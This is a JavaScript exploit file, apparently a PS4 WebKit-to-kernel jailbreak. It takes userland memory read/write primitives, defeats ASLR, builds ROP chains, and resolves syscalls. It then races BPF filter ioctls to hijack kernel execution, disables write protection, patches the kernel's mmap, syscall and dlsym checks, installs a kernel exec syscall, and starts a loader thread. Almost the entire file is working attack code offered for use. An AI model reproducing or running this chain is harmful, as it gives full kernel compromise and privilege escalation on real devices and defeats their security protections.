//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// CODE EXECUTION (STILL USERLAND) ///////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
var p;

var deref_stub_jmp = function(addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));

  if (z != 0x25FF) return 0;
  
  return addr.add32(y + 6);
}

var gadgets;

/*
kchain.push(window.gadgets["pop rax"]);
      kchain.push(savectx.add32(0x30));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(kernel_slide);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rdi"]);
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov [rdi], rax"]);
      */
gadgets = {
  "ret":                    0x0000003C,
  "jmp rax":                0x00000082,
  "ep":                     0x000000AD,
  "pop rbp":                0x000000B6,
  "mov [rdi], rax":         0x00003FBA,
  "pop r8":                 0x0000CC42,
  "pop rax":                0x0000CC43,
  "mov rax, rdi":           0x0000E84E,
  "mov rax, [rax]":         0x000130A3,
  "mov rdi, rax; jmp rcx":  0x0003447A,
  "pop rsi":                0x0007B1EE,
  "pop rdi":                0x0007B23D,
  "add rsi, rcx; jmp rsi":  0x001FA5D4,
  "pop rcx":                0x00271DE3,
  "pop rsp":                0x0027A450,
  "mov [rdi], rsi":         0x0039CF70,
  "mov [rax], rsi":         0x003D0877,
  "add rsi, rax; jmp rsi":  0x004E040C,
  "pop rdx":                0x00565838,
  "pop r9":                 0x0078BA1F,
  "add rax, rcx":           0x0084D04D,
  "jop":                    0x01277350,
  "infloop":                0x012C4009,

  "stack_chk_fail":         0x000000C8,
  "memcpy":                 0x000000F8,
  "setjmp":                 0x00001468
};

var reenter_help = { length:
    { valueOf: function(){
        return 0;
    }
}};

var postExploit = function() {
  p=window.primitives;

  p.leakfunc = function(func)
  {
    var fptr_store = p.leakval(func);
    return (p.read8(fptr_store.add32(0x18))).add32(0x40);
  }

  try {
    // Leak address of parseFloat()
    var parseFloatStore = p.leakfunc(parseFloat);
    var parseFloatPtr = p.read8(parseFloatStore);

    // Defeat ASLR
    // Get webkit module address
    var webKitBase  = p.read8(parseFloatStore);
    webKitBase.low &= 0xffffc000;
    webKitBase.sub32inplace(0xe8c000);

    window.moduleBaseWebKit = webKitBase;

    var offsetToWebKit = function(off) {
      return window.moduleBaseWebKit.add32(off)
    }

    // Set gadgets to proper addresses
    for(var gadget in gadgets) {
      gadgets[gadget] = offsetToWebKit(gadgets[gadget]);
    }

    // Get libkernel module address
    var libKernelBase  = p.read8(deref_stub_jmp(gadgets['stack_chk_fail']));
    libKernelBase.low &= 0xffffc000;
    libKernelBase.sub32inplace(0xc000);

    window.moduleBaseLibKernel = libKernelBase;

    var offsetToLibKernel = function(off) {
      return window.moduleBaseLibKernel.add32(off);
    }

    // Get libc module address
    var libSceLibcBase = p.read8(deref_stub_jmp(offsetToWebKit(0x228)));
    libSceLibcBase.low &= 0xffffc000;

    window.moduleBaseLibc = libSceLibcBase;

    var offsetToLibc = function(off) {
      return window.moduleBaseLibc.add32(off);
    }

    // Setup ROP launching
    var hold1;
    var hold2;
    var holdz;
    var holdz1;

    while (1) {
      hold1 = {a:0, b:0, c:0, d:0};
      hold2 = {a:0, b:0, c:0, d:0};
      holdz1 = p.leakval(hold2);
      holdz = p.leakval(hold1);
      if (holdz.low - 0x30 == holdz1.low) break;
    }

    var pushframe = [];
    pushframe.length = 0x80;
    var funcbuf;

    var launch_chain = function(chain)
    {
      var stackPointer = 0;
      var stackCookie = 0;
      var orig_reenter_rip = 0;
      
      var reenter_help = {length: {valueOf: function(){
        orig_reenter_rip = p.read8(stackPointer);
        stackCookie = p.read8(stackPointer.add32(8));
        var returnToFrame = stackPointer;
        
        var ocnt = chain.count;
        chain.push_write8(stackPointer, orig_reenter_rip);
        chain.push_write8(stackPointer.add32(8), stackCookie);
        
        if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
        
        chain.push(gadgets["pop rsp"]); // pop rsp
        chain.push(returnToFrame); // -> back to the trap life
        chain.count = ocnt;
        
        p.write8(stackPointer, (gadgets["pop rsp"])); // pop rsp
        p.write8(stackPointer.add32(8), chain.stackBase); // -> rop frame
      }}};
      
      var funcbuf32 = new Uint32Array(0x100);
      nogc.push(funcbuf32);
      funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));
      
      p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
      p.write8(funcbuf.add32(0x80), gadgets["jop"]);
      p.write8(funcbuf,funcbuf);
      p.write8(parseFloatStore, gadgets["jop"]);
      var orig_hold = p.read8(holdz1);
      var orig_hold48 = p.read8(holdz1.add32(0x48));
      
      p.write8(holdz1, funcbuf.add32(0x50));
      p.write8(holdz1.add32(0x48), funcbuf);
      parseFloat(hold2,hold2,hold2,hold2,hold2,hold2);
      p.write8(holdz1, orig_hold);
      p.write8(holdz1.add32(0x48), orig_hold48);
      
      stackPointer = p.read8(funcbuf.add32(0x10));
      stackCookie = p.read8(stackPointer.add32(8));
      rtv=Array.prototype.splice.apply(reenter_help);
      return p.leakval(rtv);
    }

    p.loadchain = launch_chain;

    // Dynamically resolve syscall wrappers from libkernel
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);
    
    p.write8(kstr, window.moduleBaseLibKernel);
    p.write4(kstr.add32(8), 0x40000);

    var countbytes;
    for (var i=0; i < 0x40000; i++)
    {
        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63)
        {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i=0; i < countbytes; i++)
    {
        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05)
        {
            dview8[0] = kview[i+3];
            dview8[1] = kview[i+4];
            dview8[2] = kview[i+5];
            dview8[3] = kview[i+6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.moduleBaseLibKernel.add32(i);
        }
    }

    // Setup helpful primitives for calling and string operations
    var chain = new window.rop();

    p.fcall = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
      chain.clear();
      
      chain.notimes = this.next_notime;
      this.next_notime = 1;

      chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
      
      chain.push(window.gadgets["pop rdi"]); // pop rdi
      chain.push(chain.stackBase.add32(0x3ff8)); // where
      chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
      
      chain.push(window.gadgets["pop rax"]); // pop rax
      chain.push(p.leakval(0x41414242)); // where
      
      if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
      
      return p.read8(chain.stackBase.add32(0x3ff8));
    }

    p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
      if (typeof sysc == "string") {
        sysc = window.syscallnames[sysc];
      }

      if (typeof sysc != "number") {
        throw new Error("invalid syscall");
      }
      
      var off = window.syscalls[sysc];

      if (off == undefined) {
        throw new Error("invalid syscall");
      }
      
      return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
    }

    p.writeString = function (addr, str)
    {
      for (var i = 0; i < str.length; i++)
      {
        var byte = p.read4(addr.add32(i));
        byte &= 0xFFFF0000;
        byte |= str.charCodeAt(i);
        p.write4(addr.add32(i), byte);
      }
    }

    p.readString = function(addr)
    {
      var byte = p.read4(addr);
      var str  = "";
      while (byte & 0xFF)
      {
        str += String.fromCharCode(byte & 0xFF);
        addr.add32inplace(1);
        byte = p.read4(addr);
      }
      return str;
    }

    var spawnthread = function (chain) {
      var longjmp       = offsetToWebKit(0x1458);
      var createThread  = offsetToWebKit(0x116ED40);

      var contextp = mallocu32(0x2000);
      var contextz = contextp.backing;
      contextz[0] = 1337;
      p.syscall(324, 1);

      var thread2 = new window.rop();

      thread2.clear();
      thread2.push(window.gadgets["ret"]); // nop
      thread2.push(window.gadgets["ret"]); // nop
      thread2.push(window.gadgets["ret"]); // nop

      thread2.push(window.gadgets["ret"]); // nop
      chain(thread2);

      p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
      p.write8(contextp.add32(0x10), thread2.stackBase); // rsp

      var test = p.fcall(createThread, longjmp, contextp, stringify("GottaGoFast"));

      window.nogc.push(contextz);
      window.nogc.push(thread2);

      return thread2;
    }

    var run_count = 0;

    function kernel_rop_run(fd, scratch) {
      // wait for it
      while (1) {
        var ret = p.syscall("sys_write", fd, scratch, 0x200);
        run_count++;
        if (ret.low == 0x200) {
            return ret;
        }
      }
    }

    // Clear errno
    p.write8(offsetToLibKernel(0x7CCF0), 0);

    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // KERNEL EXPLOIT BEGINS /////////////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //alert("OHHH WE'RE HALFWAY THERE WOOOOOOAHHH LIVIN ON A PRAYER")

    var test = p.syscall("sys_setuid", 0);

    // Check if homebrew has already been enabled, if not, run kernel exploit :D
    if(test != '0') {
      /////////////////// STAGE 1: Setting Up Programs ///////////////////

      var spadp = mallocu32(0x2000);

      // Open first device and bind
      var fd1 = p.syscall("sys_open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR

      if(fd1 < 0) {
        throw "Failed to open first /dev/bpf device!";
      }
      
      p.syscall("sys_ioctl", fd1, 0x8020426C, stringify("eth0")); // 8020426C = BIOCSETIF

      if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0)) {
        p.syscall("sys_ioctl", fd1, 0x8020426C, stringify("wlan0"));

        if (p.syscall("sys_write", fd1, spadp, 40).low == (-1 >>> 0)) {
          throw "Failed to bind to first /dev/bpf device!";
        }
      }

      // Open second device and bind
      var fd2 = p.syscall("sys_open", stringify("/dev/bpf"), 2, 0); // 0666 permissions, open as O_RDWR

      if(fd2 < 0) {
        throw "Failed to open second /dev/bpf device!";
      }

      p.syscall("sys_ioctl", fd2, 0x8020426C, stringify("eth0")); // 8020426C = BIOCSETIF

      if (p.syscall("sys_write", fd2, spadp, 40).low == (-1 >>> 0)) {
        p.syscall("sys_ioctl", fd2, 0x8020426C, stringify("wlan0"));

        if (p.syscall("sys_write", fd2, spadp, 40).low == (-1 >>> 0)) {
          throw "Failed to bind to second /dev/bpf device!";
        }
      }

      // Setup kchain stack for kernel ROP chain
      var kchainstack = malloc(0x2000);
      
      /////////////////// STAGE 2: Building Kernel ROP Chain ///////////////////
      var kchain  = new krop(p, kchainstack);
      var savectx = malloc(0x200);

      // NOP Sled
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);
      kchain.push(window.gadgets["ret"]);

      // Save context to exit back to userland when finished
      kchain.push(window.gadgets["pop rdi"]);
      kchain.push(savectx);
      kchain.push(offsetToLibc(0x1D3C));

      // Defeat kASLR (resolve kernel .text base)
      var kernel_slide = new int64(-0x2610AD0, -1);
      kchain.push(window.gadgets["pop rax"]);
      kchain.push(savectx.add32(0x30));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(kernel_slide);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rdi"]);
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov [rdi], rax"]);
        
      // Disable kernel write protection
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x280f79);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(offsetToWebKit(0x12a16)); // mov rdx, rax
      kchain.push(window.gadgets["pop rax"]);
      kchain.push(0x80040033);
      kchain.push(offsetToWebKit(0x1517c7)); // jmp rdx

      // Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
      // E8 C8 37 13 00 41 89 C6 -> B8 00 00 00 00 41 89 C6
      var kexploit_check_patch = new int64(0x000000B8, 0xC6894100);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x1144E3);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kexploit_check_patch);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Patch sys_mmap: Allow RWX (read-write-execute) mapping
      var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x141D14);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_mmap_patch);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Patch syscall: syscall instruction allowed anywhere
      var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
      var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x3DC603);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_syscall_patch1);
      kchain.push(window.gadgets["mov [rax], rsi"]);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x3DC621);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_syscall_patch2);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Patch sys_dynlib_dlsym: Allow from anywhere
      var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
      var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x3CF6FE);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_dlsym_patch1);
      kchain.push(window.gadgets["mov [rax], rsi"]);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x690C0);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_dlsym_patch2);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Add custom sys_exec() call to execute arbitrary code as kernel
      var kernel_exec_param = new int64(0, 1);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x102b8a0);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(0x02);
      kchain.push(window.gadgets["mov [rax], rsi"]);
      kchain.push(window.gadgets["pop rsi"])
      kchain.push(0x13a39f); // jmp qword ptr [rsi]
      kchain.push(window.gadgets["pop rdi"])
      kchain.push(savectx.add32(0x50));
      kchain.push(offsetToWebKit(0x119d1f0)); //add rsi, [rdi]; mov rax, rsi
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x102b8a8);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["mov [rax], rsi"]);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x102b8c8);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_exec_param);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Enable kernel write protection
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x280f70);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["jmp rax"])

      // To userland!
      kchain.push(window.gadgets["pop rax"]);
      kchain.push(0);
      kchain.push(window.gadgets["ret"]);
      kchain.push(offsetToWebKit(0x3EBD0));

      // Setup valid program
      var bpf_valid_prog          = malloc(0x10);
      var bpf_valid_instructions  = malloc(0x80);

      p.write8(bpf_valid_instructions.add32(0x00), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x08), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x10), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x18), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x20), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x28), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x30), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x38), 0x00000000);
      p.write4(bpf_valid_instructions.add32(0x40), 0x00000006);
      p.write4(bpf_valid_instructions.add32(0x44), 0x00000000);

      p.write8(bpf_valid_prog.add32(0x00), 0x00000009);
      p.write8(bpf_valid_prog.add32(0x08), bpf_valid_instructions);

      // Setup invalid program
      var entry = window.gadgets["pop rsp"];
      var bpf_invalid_prog          = malloc(0x10);
      var bpf_invalid_instructions  = malloc(0x80);

      p.write4(bpf_invalid_instructions.add32(0x00), 0x00000001);
      p.write4(bpf_invalid_instructions.add32(0x04), entry.low);
      p.write4(bpf_invalid_instructions.add32(0x08), 0x00000003);
      p.write4(bpf_invalid_instructions.add32(0x0C), 0x0000001E);
      p.write4(bpf_invalid_instructions.add32(0x10), 0x00000001);
      p.write4(bpf_invalid_instructions.add32(0x14), entry.hi);
      p.write4(bpf_invalid_instructions.add32(0x18), 0x00000003);
      p.write4(bpf_invalid_instructions.add32(0x1C), 0x0000001F);
      p.write4(bpf_invalid_instructions.add32(0x20), 0x00000001);
      p.write4(bpf_invalid_instructions.add32(0x24), kchainstack.low);
      p.write4(bpf_invalid_instructions.add32(0x28), 0x00000003);
      p.write4(bpf_invalid_instructions.add32(0x2C), 0x00000020);
      p.write4(bpf_invalid_instructions.add32(0x30), 0x00000001);
      p.write4(bpf_invalid_instructions.add32(0x34), kchainstack.hi);
      p.write4(bpf_invalid_instructions.add32(0x38), 0x00000003);
      p.write4(bpf_invalid_instructions.add32(0x3C), 0x00000021);
      p.write4(bpf_invalid_instructions.add32(0x40), 0x00000006);
      p.write4(bpf_invalid_instructions.add32(0x44), 0x00000001);

      p.write8(bpf_invalid_prog.add32(0x00), 0x00000009);
      p.write8(bpf_invalid_prog.add32(0x08), bpf_invalid_instructions);

      /////////////////// STAGE 3: Racing Filters ///////////////////

      // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one
      spawnthread(function (thread2) {
        interrupt1 = thread2.stackBase;
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["pop rdi"]); // pop rdi
        thread2.push(fd1); // what
        thread2.push(window.gadgets["pop rsi"]); // pop rsi
        thread2.push(0x8010427B); // what
        thread2.push(window.gadgets["pop rdx"]); // pop rdx
        thread2.push(bpf_valid_prog); // what
        thread2.push(window.gadgets["pop rsp"]); // pop rsp
        thread2.push(thread2.stackBase.add32(0x800)); // what
        thread2.count = 0x100;
        var cntr = thread2.count;
        thread2.push(window.syscalls[54]); // ioctl
        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
        thread2.push(window.gadgets["pop rsp"]); // pop rdx
        thread2.push(thread2.stackBase); // what
      });

      // ioctl() with invalid BPF program will be sprayed and eventually get used by the thread where the program has already been validated
      spawnthread(function (thread2) {
        interrupt2 = thread2.stackBase;
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["pop rdi"]); // pop rdi
        thread2.push(fd2); // what
        thread2.push(window.gadgets["pop rsi"]); // pop rsi
        thread2.push(0x8010427B); // what
        thread2.push(window.gadgets["pop rdx"]); // pop rdx
        thread2.push(bpf_invalid_prog); // what
        thread2.push(window.gadgets["pop rsp"]); // pop rsp
        thread2.push(thread2.stackBase.add32(0x800)); // what
        thread2.count = 0x100;
        var cntr = thread2.count;
        thread2.push(window.syscalls[54]); // ioctl
        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]); // restore ioctl
        thread2.push(window.gadgets["pop rsp"]); // pop rdx
        thread2.push(thread2.stackBase); // what
      });

      /////////////////// STAGE 3: Trigger ///////////////////
      var scratch = malloc(0x200);
      var test = kernel_rop_run(fd1, scratch);

      if(p.syscall("sys_setuid", 0) == 0) {
        allset();
      } else {
        throw "Kernel exploit failed!";
      }
    } else {
      // Everything done already :D
      allset();
    }

    // create loader memory
    var code_addr = new int64(0x26100000, 0x00000009);
    var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);

    // verify loaded
    if (buffer == '926100000') {
      // setup the stuff
      var scePthreadCreate = offsetToLibKernel(0x115c0);
      var thread = malloc(0x08);
      var thr_name = malloc(0x10);
      p.writeString(thr_name, "loader");

      // write loader
      writeLoader(p, code_addr);

      var createRet = p.fcall(scePthreadCreate, thread, 0, code_addr, 0, thr_name);
    }
  } catch(e) {
    fail("Post Exception: " + e)
  }
}
